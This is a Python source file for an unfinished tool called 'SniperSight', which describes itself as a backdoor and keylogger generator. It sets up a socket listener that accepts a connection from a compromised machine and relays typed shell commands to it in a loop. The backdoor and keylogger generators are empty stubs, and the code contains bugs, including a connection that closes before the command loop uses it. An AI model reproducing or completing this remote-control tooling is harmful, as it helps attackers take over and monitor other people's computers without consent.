import socket
import time
import platform
from pynput import *
import os
from termcolor import colored

# UNFINISHED PROJECT

# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")

Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(colored('''
        ██████  ███▄    █  ██▓ ██▓███  ▓█████  ██▀███    ██████  ██▓  ▄████  ██░ ██ ▄▄▄█████▓
        ▒██    ▒  ██ ▀█   █ ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒
        ░ ▓██▄   ▓██  ▀█ ██▒▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░
          ▒   ██▒▓██▒  ▐▌██▒░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ 
        ▒██████▒▒▒██░   ▓██░░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██████▒▒░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ 
        ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   
        ░ ░▒  ░ ░░ ░░   ░ ▒░ ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ▒ ░  ░   ░  ▒ ░▒░ ░    ░    
        ░  ░  ░     ░   ░ ░  ▒ ░░░          ░     ░░   ░ ░  ░  ░   ▒ ░░ ░   ░  ░  ░░ ░  ░      
              ░           ░  ░              ░  ░   ░           ░   ░        ░  ░  ░  ░         
                                                                                         ''', 'red'))
    print(colored("     SniperSight - Listener, Backdoor & Keylogger Generator Developed & Maintained By www.abrupt9.com", "cyan"))
    print()
Banner()

# =====================================================> Main Menu
def Menu():
    print(colored("""
1) Start Backdoor Listener
2) Create a Backdoor
3) Create a Keylogger
""", 'blue'))
    print()
Menu()
# =====================================================> Vars
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
des = input(colored("[*] Select Options: ", 'yellow'))
SEPARATOR = "<sep>"
BUFFER_SIZE = 1024 * 128
# =====================================================> Backdoor Listener
def Listener():
    HOSTIP = input(colored("[*] Enter HOST IP: ", "cyan"))
    HOSTPORT = 4434
    print(colored("Creating Listener. Please Wait...", "cyan"))
    time.sleep(2)
    s.bind((HOSTIP, HOSTPORT))
    s.listen(5)
    print(colored(f"Listener Created on {HOSTIP}:{HOSTIP} Waiting for Hits...", "red"))
    conn, addr = s.accept()
    with conn:
        cwd = conn.recv(BUFFER_SIZE).decode()
        print(colored(f"Shell Connection From: {conn}", "cyan"))
    while True:
        # get the command from prompt
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        conn.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = conn.recv(BUFFER_SIZE).decode()
        # split command output and current directory
        results, cwd = output.split(SEPARATOR)
        # print output
        print(results)







if des >= "1":
    Listener()

else:
    pass


if des >= "2":
    pass

